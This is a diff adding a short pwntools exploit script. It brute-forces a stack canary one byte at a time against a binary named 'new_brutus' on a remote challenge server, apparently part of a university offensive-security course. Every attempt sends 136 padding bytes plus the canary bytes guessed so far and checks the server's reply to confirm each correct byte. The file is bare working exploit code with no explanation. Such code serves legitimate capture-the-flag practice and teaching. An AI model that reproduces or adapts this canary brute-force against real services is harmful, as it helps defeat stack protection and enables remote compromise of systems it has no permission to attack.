@@ -1,0 +1,29 @@
+from pwn import *
+
+context.log_level = 'error'
+def function():
+	context.arch='amd64'
+	context.log_level = 'error'
+	e=ELF('./new_brutus')
+	magic = b'\x00'
+	my_var = 138
+	while len(magic) < 8:
+		for char in range(256):
+			print(f'trying {char}')
+			r = remote('offsec-chalbroker.osiris.cyber.nyu.edu')
+			r.sendline(b'netid')
+			r.recvuntil(b'name?')
+			r.send(bytes(str(my_var), 'utf-8'))
+			r.send(b'A'*136 + magic + bytes([char]))
+			stuff = r.recvall()
+			r.close()
+			if b'goodbye!' in stuff:
+				magic += bytes([char])
+				my_var = my_var + 1
+				print(magic)		
+				break
+
+	return magic
+
+my_magic = function()
+
